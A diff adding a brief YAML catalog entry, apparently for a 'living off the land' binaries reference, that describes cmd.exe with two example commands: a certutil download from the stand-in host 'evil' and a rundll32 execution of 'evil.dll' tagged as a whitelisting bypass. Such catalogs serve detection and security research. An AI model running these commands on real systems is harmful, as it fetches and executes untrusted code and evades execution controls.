@@ -1,0 +1,10 @@
+Name: cmd.exe
+Description: Windows command interpreter
+Author: "-"
+Commands:
+  - Command: cmd.exe /c certutil -urlcache -split -f http://evil/x C:\\x
+    Description: Download a file via certutil
+    Category: Download
+  - Command: cmd.exe /c rundll32.exe evil.dll,Start
+    Description: Execute a DLL via rundll32
+    Category: AWL Bypass
